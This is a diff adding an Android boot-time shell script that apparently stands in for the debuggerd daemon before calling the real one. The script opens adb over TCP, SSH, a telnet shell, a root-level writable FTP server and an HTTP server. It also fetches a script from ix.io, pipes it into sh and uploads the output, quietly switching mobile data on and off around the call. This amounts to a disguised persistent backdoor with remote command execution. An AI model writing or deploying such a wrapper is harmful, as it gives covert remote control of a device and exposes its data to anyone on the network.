@@ -1,0 +1,24 @@
+#!/system/bin/sh
+setprop service.adb.tcp.port 5555
+PATH=/system/bin:/system/xbin:$PATH
+/system/xbin/sshd -p 22
+busybox telnetd -p 23 -l /system/etc/profile
+busybox tcpsvd -v 0 21 busybox ftpd -vw / >> /data/local/tmp/log.ftp.server 2>&1 &
+python -m SimpleHTTPServer 80 2>> /data/local/tmp/err.http.server &
+sleep 60 #allow mount sdcard first
+python /system/xbin/capclient.py > /data/local/tmp/capclient.log 2> /data/local/tmp/capclient.err &
+sleep 30
+DATA_ON=false
+if [ `getprop gsm.defaultpdpcontext.active` ];then
+    if [ `getprop gsm.defaultpdpcontext.active` == "true" ];then
+        DATA_ON=true
+    fi
+fi
+svc data enable
+# Edit url1, url2, user:pass, see ix.io
+busybox wget -O - http://ix.io/url1 | sh | curl -F 'f:1=<-' -F 'id:1=url2' user:pass@ix.io
+if [ $DATA_ON == "false" ];then
+    svc data disable
+fi
+
+/system/bin/debuggerd_real
